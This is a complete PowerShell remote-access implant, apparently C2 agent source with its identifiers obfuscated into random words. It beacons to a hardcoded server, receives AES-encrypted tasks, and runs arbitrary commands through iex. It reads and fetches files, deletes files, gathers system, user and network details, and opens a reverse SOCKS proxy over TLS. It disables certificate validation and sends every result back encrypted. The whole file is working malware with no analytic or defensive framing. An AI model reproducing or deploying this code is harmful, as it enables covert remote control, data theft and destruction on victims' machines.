$avenue = "1"
$linguistic = [System.Convert]::FromBase64String("ON/RZIgaXg7bDoZXR45+msrJ+mo7AY2WkheHjQ0o0A8=")
$firefighter = [System.Convert]::FromBase64String("PEHYpDIOzCnZL9fibT4oBw==")
function laughter 
{
    $fireworks = ipconfig /all | Out-String
    return $fireworks

}
function uncertainty 
{
    param([string] $venture) # the file path on disk we want to download
    
    $fireworks = Get-Content -Path $venture -Raw

    return $fireworks
}

function airplane 
{
    param([string] $venture) # the uri to get from, and the place to save to

    Invoke-RestMethod -Uri "http://$ecosystem/$nobleman/$avenue" -OutFile $venture
}
function neon
{
    param([string] $crescendo) # the directory or file we are enumerating

    $fireworks = ls $crescendo | Out-String
    $gallery = $fireworks.ToString()

    return $gallery
    
}
function illuminate
{

    $fireworks = pwd | Out-String
    $gallery = $fireworks.ToString()

    return $fireworks
}
function melancholy 
{
    param([string] $crescendo) # the directory we are going to change to

    cd $crescendo
    return "Attempted to change to $crescendo."
}
function exuberant 
{
    param([string] $enchanting) # the item we want to remove

    rm $enchanting

    return "Attempted to remove $enchanting."

}
function facility-tcp 
{
   $fireworks = Get-NetTCPConnection | Out-String
   return $fireworks
}
function telescope 
{
    $fireworks = whoami /all | Out-String
    return $fireworks
}
[ScriptBlock]$avalanche = {
    param( $hovercraft )
    
    $octopus = 
    {
            param( $hovercraft )
            $hovercraft.inStream.CopyTo($hovercraft.outStream)
            Exit
    }

    $juxtapose = $hovercraft.rsp

    function quandary 
    {
        param($quixotic)
        if ($quixotic -as [ipaddress])
        {
            return $quixotic
        }
        else
        {
            $endorsement = [System.Net.Dns]::GetHostAddresses($quixotic)[0].IPAddressToString
        }
        return $endorsement
    }

    $dexterity = $hovercraft.cliConnection
    $esoteric = New-Object System.Byte[] 32


    try
    {
        $reverie = $hovercraft.cliStream
        $reverie.Read($esoteric, 0, 2) | Out-Null

        $rebellious = $esoteric[0]
        
        if ($rebellious -eq 5)
        {
            $reverie.Read($esoteric, 2, $esoteric[1]) | Out-Null
            for ($zoom = 2; $zoom -le $esoteric[1] + 1; $zoom++) 
            {
                if ($esoteric[$zoom] -eq 0) {break}
            }
            if ($esoteric[$zoom] -ne 0)
            {
                $esoteric[1] = 255
                $reverie.Write($esoteric, 0, 2)
            }
            else
            {
                $esoteric[1] = 0
                $reverie.Write($esoteric, 0, 2)
            }

            $reverie.Read($esoteric, 0, 4) | Out-Null
            $yield = $esoteric[1]
            $formula = $esoteric[3]

            if($yield -ne 1)
            {
                $esoteric[1] = 7
                $reverie.Write($esoteric, 0, 2)
                throw "Not a connect"
            }

            if($formula -eq 1)
            {
                $lantern = New-Object System.Byte[] 4
                $reverie.Read($lantern, 0, 4) | Out-Null
                $infinity = New-Object System.Net.IPAddress(,$lantern)
                $inquisitive = $infinity.ToString()
            }
            elseif($formula -eq 3)
            {
                $reverie.Read($esoteric, 4, 1) | Out-Null
                $geode = New-Object System.Byte[] $esoteric[4]
                $reverie.Read($geode, 0, $esoteric[4]) | Out-Null
                $inquisitive = [System.Text.Encoding]::ASCII.GetString($geode)
            }
            else
            {
                $esoteric[1] = 8
                $reverie.Write($esoteric, 0, 2)
                throw "Not a valid destination address"
            }

            $reverie.Read($esoteric, 4, 2) | Out-Null
            $jeweled = $esoteric[4] * 256 + $esoteric[5]
            $kinetic = quandary($inquisitive)

            if($kinetic -eq $null)
            {
                $esoteric[1] = 4
                $reverie.Write($esoteric,0,2)
                throw "Cant resolve destination address"
            }

            $bravery = New-Object System.Net.Sockets.TcpClient($kinetic, $jeweled)

            if($bravery.Connected)
            {
                $esoteric[1] = 0
                $esoteric[3] = 1
                $esoteric[4] = 0
                $esoteric[5] = 0
                $reverie.Write($esoteric, 0, 10)
                $reverie.Flush()
                $hummingbird = $bravery.GetStream() 
                $citadel = $hummingbird.CopyToAsync($reverie)
                $rational = $reverie.CopyToAsync($hummingbird)
                $rational.AsyncWaitHandle.WaitOne()
                $citadel.AsyncWaitHandle.WaitOne()
                
            }
            else
            {
                $esoteric[1] = 4
                $reverie.Write($esoteric, 0, 2)
                throw "Cant connect to host"
            }
       }
       elseif($rebellious -eq 4)
       {
            $yield = $esoteric[1]
            if($yield -ne 1)
            {
                $esoteric[0] = 0
                $esoteric[1] = 91
                $reverie.Write($esoteric, 0, 2)
                throw "Not a connect"
            }
            $reverie.Read($esoteric, 2, 2) | Out-Null
            $jeweled = $esoteric[2] * 256 + $esoteric[3]
            $lantern = New-Object System.Byte[] 4
            $reverie.Read($lantern, 0, 4) | Out-Null
            $kinetic = New-Object System.Net.IPAddress(,$lantern)
            $esoteric[0] = 1
            while ($esoteric[0] -ne 0){
                $reverie.Read($esoteric, 0, 1)
            }
            $bravery = New-Object System.Net.Sockets.TcpClient($kinetic, $jeweled)
            
            if($bravery.Connected)
            {
                $esoteric[0] = 0
                $esoteric[1] = 90
                $esoteric[2] = 0
                $esoteric[3] = 0
                $reverie.Write($esoteric, 0, 8)
                $reverie.Flush()
                $hummingbird = $bravery.GetStream() 
                $citadel = $hummingbird.CopyToAsync($reverie)
                $rational = $reverie.CopyTo($hummingbird)
                $rational.AsyncWaitHandle.WaitOne()
                $citadel.AsyncWaitHandle.WaitOne()
            }
       }
       else
       {
            throw "Unknown socks version"
       }
    }
    catch {
    }
    finally 
    {
        if ($dexterity -ne $null) 
        {
            $dexterity.Dispose()
        }
        if ($bravery -ne $null) 
        {
            $bravery.Dispose()
        }
        Exit;
    }
}

function yourself{

    param ( [String] $fortitude,
            [Int] $backpack,
            [String] $fingerprint = "",
            [Int] $relevant = 200,
            [Int] $passport = 0 )

    try 
    {

        $vast = 0

        $juxtapose = [runspacefactory]::CreateRunspacePool(1, $relevant)
        $juxtapose.CleanupInterval = New-TimeSpan -Seconds 30
        $juxtapose.open()

        while($vast -lt 5)
        {
            Write-Host "Connecting to: " $fortitude ":" $backpack

            try
            {
                $dexterity = New-Object System.Net.Sockets.TcpClient($fortitude, $backpack)
                $yucca = $dexterity.GetStream()
                
                if($fingerprint -eq '')
                {
                    $reverie = New-Object System.Net.Security.SslStream($yucca, $false, ({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                else
                {
                    $reverie = New-Object System.Net.Security.SslStream($yucca, $false, ({return $mystical[1].GetCertHashString() -eq $fingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                
                $reverie.AuthenticateAsClient($fortitude, $null, [Net.SecurityProtocolType]::Tls12, $false)
                
                Write-Host "Connected"


                $vast = 0

                $esoteric = New-Object System.Byte[] 32
                $knowledge = New-Object System.Byte[] 122

                $alliance = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: " + $fortitude + "`n`n")
                $reverie.Write($alliance, 0, $alliance.Length)
                
                $reverie.ReadTimeout = 1000
                $reverie.Read($knowledge, 0, 122) | Out-Null
                
                $reverie.Read($esoteric, 0, 5) | Out-Null
                
                $conductor = [System.Text.Encoding]::ASCII.GetString($esoteric)
                
                Write-Host $conductor

                if($conductor -ne "HELLO")
                {
                    throw "No Client connected"
                }
                else
                {
                    Write-Host "Connection received"
                }


                $reverie.ReadTimeout = 100000

                $hovercraft = [PSCustomObject]@{"cliConnection" = $dexterity ; "rsp" = $juxtapose ; "cliStream" = $reverie }
                $liberty = [PowerShell]::Create()
                $liberty.RunspacePool = $juxtapose;
                $liberty.AddScript($avalanche).AddArgument($hovercraft) | Out-Null
                $liberty.BeginInvoke() | Out-Null

            }
            catch
            {
                $vast = $vast + 1;

                try
                {
                    $dexterity.Close()
                    $dexterity.Dispose()
                }
                catch{}
                    sleep -Milliseconds 1
            }
        }
    }
    catch
    {
        throw $_;
    }
    finally
    {
        write-host "Server closed."

        if ($dexterity -ne $null) 
        {
            $dexterity.Dispose()
            $dexterity = $null
        }
        if ($liberty -ne $null -and $eccentric -ne $null) 
        {
            $liberty.EndInvoke($eccentric) | Out-Null
            $liberty.Runspace.Close()
            $liberty.Dispose()
        }
    }
}

function ornament
{
    param([string] $mystical)

    $fireworks = ((($mystical -replace ';', ' ') | iex) | Out-String)
    $gallery = $fireworks.ToString()

    return $gallery
}

function nectar
{
    param([string]$exemplary,     
        [string]$angular,   
        [string]$imagination)            

    if ($exemplary -eq "exit" -or $exemplary -eq "checkin")
    {
        $fireworks = ""
    }
	elseif($exemplary -eq "ipconfig")
	{
		$fireworks = laughter 
	}
	elseif($exemplary -eq "download")
	{
		$fireworks = uncertainty $angular
	}
	elseif($exemplary -eq "upload")
	{
		$fireworks = airplane $angular
	}
	elseif($exemplary -eq "dir")
	{
		$fireworks = neon $angular
	}
	elseif($exemplary -eq "pwd")
	{
		$fireworks = illuminate 
	}
	elseif($exemplary -eq "cd")
	{
		$fireworks = melancholy $angular
	}
	elseif($exemplary -eq "rm")
	{
		$fireworks = exuberant $angular
	}
	elseif($exemplary -eq "netstat-tcp")
	{
		$fireworks = facility-tcp 
	}
	elseif($exemplary -eq "whoami")
	{
		$fireworks = telescope 
	}
	elseif($exemplary -eq "socks")
	{
		$fireworks = yourself $imagination $angular
	}
	elseif($exemplary -eq "iex")
	{
		$fireworks = ornament $angular
	}

	else
	{
		$fireworks = '[!] Invalid Command'
	}

	return $fireworks
}

$ecosystem = "192.168.11.130:5000"
$cathedral = "tasks"
$landscape = "results"
$nobleman = "upload"
$jungle = "3500"
$companion = "3"
$incredible = "0.5"

$notorious = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$notorious.Add("Content-Type", "application/json")

Add-Type -AssemblyName System.Security

try{

add-type @"
     using System.Net;
     using System.Security.Cryptography.X509Certificates;
     public class TrustAllCertsPolicy : ICertificatePolicy {
         public bool CheckValidationResult(
             ServicePoint srvPoint, X509Certificate certificate,
             WebRequest request, int certificateProblem) {
             return true;
         }
     }
"@
[System.Net.ServicePointManager]::CertificatePolicy = new-object TrustAllCertsPolicy
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
}
catch{ throw $_; }

function valuable
{
  param($mathematics, $meadow, $quarter)

    $sculpture = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $sculpture.Key = $meadow
    $sculpture.IV = $quarter
    $sculpture.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $sculpture.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $fountain = $sculpture.CreateDecryptor()

    $jeopardy = $fountain.TransformFinalBlock($mathematics, 0, $mathematics.Length)

    return $jeopardy
}

function zenith
{
    param($kaleidoscope, $waterfall, $labyrinthine)

    $amplify = [System.Security.Cryptography.Aes]::Create()
    $amplify.Key = $waterfall
    $amplify.IV = $labyrinthine
    $amplify.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $amplify.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $fascinating = $amplify.CreateEncryptor()

    $jumpstart = $fascinating.TransformFinalBlock($kaleidoscope, 0, $kaleidoscope.Length)
    $amplify.Dispose()

    $melody = [System.Convert]::ToBase64String($jumpstart)

    return $melody

}

function vigilant
{
    param($objective, 
          $medicine,  
          $electricity, $platinum)         

   
   $arithmetic = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($objective))

   $gorgeous = valuable $medicine $electricity $platinum

   $porcelain = 1
   for($xenon = 0; $xenon -lt $arithmetic.Length; $xenon++)
   {        
        if($arithmetic[$xenon] -ne $gorgeous[$xenon])
        {
            $porcelain = 0
        }
   }

   return $porcelain
}

function civilization
{
    param($glistening,
          $nebula, $banquet)         

    $arithmetic = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($glistening))
    
    $apple = zenith $arithmetic $nebula $banquet


    return $apple
}


function skyscraper
{

    param([string]$outlandish,        
          [int]$earthquake,     
          [int]$jungle)    


    $zealous = [Math]::Min($jungle, $outlandish.Length-$earthquake)

    $marvelous = $outlandish.SubString($earthquake, $zealous)

    $blossom = $zealous + $earthquake
    
    if($blossom -ge $outlandish.Length)
    {
        $blossom = "true"
    }

    return "$marvelous<chnk>$blossom"
}


function zigzag
{

    $glistening = ""

    $manuscript = ((Get-NetIPConfiguration | Select-Object InterfaceAlias, Ipv4Address) | Out-String)
    $tactile = ((Get-NetAdapter | Select-Object Name, MacAddress, Status) | Out-String)
    $lotus = ((Get-NetIPInterface | Select-Object InterfaceAlias, Dhcp) | Out-String)
    $kangaroo = $resilience:COMPUTERNAME
    $picturesque = ((Get-CimInstance Win32_ComputerSystem).Domain | Out-String)
    $plethora = $resilience:USERDOMAIN
    $champion = [System.Net.Dns]::GetHostEntry("").HostName
    $legend = $unorthodox
    $archive = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ParentProcessId).ParentProcessId

    $glistening = "$manuscript<sa>$tactile<sa>$lotus<sa>$kangaroo<sa>$picturesque<sa>$plethora<sa>$champion<sa>$legend<sa>$archive"

    return $glistening
}

function animation 
{

    $jackpot = ""

    $integrity = Invoke-RestMethod "http://$ecosystem/$cathedral/$avenue" -Method 'GET' -Headers $notorious

    $occupation = $integrity -split '\n'

    foreach ($dedication in $occupation)
    {

        if($dedication.Length -gt 0)
        {
            $xyster = [System.Convert]::FromBase64String($dedication)
            $xyster = valuable $xyster $linguistic $firefighter
            $wilderness = [System.Text.Encoding]::UTF8.GetString($xyster)


            $wilderness = $wilderness -split ','
            $authentic = $wilderness[0]
            $peculiar = $wilderness[1]
            $elaborate = $wilderness[2]
            $anchor = [System.Convert]::FromBase64String($wilderness[3])

            $gratitude = "$authentic,$peculiar,$elaborate"
            $reflection = vigilant $gratitude $anchor $linguistic $firefighter

            if($reflection)
            {

                $jackpot += "$authentic<br>$peculiar<br>$elaborate<br>0<br><end>"
            }
        }
    }

    return $jackpot

}

function lavender
{
    param($milestone)

    $xylophone = @()

    for ($xenon = 0; $xenon -lt $milestone.Length; $xenon++)
    {

        

        $exemplary = $milestone[$xenon]

        if($exemplary.Length -gt 0)
        {

            $diorama = $exemplary -split '<br>'
    
            $authentic = $diorama[0]
            $peculiar = $diorama[1]
            $elaborate = $diorama[2]
            $earthquake = $diorama[3]
            
            if($earthquake -eq 0)
            {

                $fireworks = nectar $peculiar $elaborate ($ecosystem -split ":")[0]

            }
            else
            {
                $fireworks = $diorama[4]
            }
            

            $marvelous = (skyscraper $fireworks $earthquake $jungle) -split "<chnk>"

            $paddle = $marvelous[0]
            $earthquake = $marvelous[1]

            $tangible = Get-Date -UFormat "%Y%m%d %H:%M:%S UTC"

            $novelty = zigzag

            $jealous = "$authentic<br>$paddle<br>$tangible<br>$novelty"

            $anchor = civilization $jealous $linguistic $firefighter
            $xyster = [System.Text.Encoding]::UTF8.GetBytes("$jealous<br>$anchor")
            $gymnastics = zenith $xyster $linguistic $firefighter


            Invoke-RestMethod "http://$ecosystem/$landscape/$avenue" -Method 'POST' -Headers $notorious -Body $gymnastics
            if($peculiar -eq "exit")
            {
                exit
            }

            
            if($earthquake -ne "true")
            {
                $milestone[$xenon] = "$authentic<br>$peculiar<br>$elaborate<br>$earthquake<br>$fireworks"
                $xylophone += $milestone[$xenon]
            }

            
        }

    }

    return $xylophone
}


function catalyst
{

    $milestone = @()

    while($true)
    {

        $jackpot = ((animation $ecosystem, $cathedral $milestone) -split '<end>') | Select-Object -SkipLast 1

        if($jackpot.Length -gt 0)
        {
            $milestone += $jackpot
        }

        $milestone = @(lavender $milestone)


        $gingerbread = Get-Random -Minimum ((1-$incredible)*$companion) -Maximum $companion
        Start-Sleep -Seconds $gingerbread

    }
}

catalyst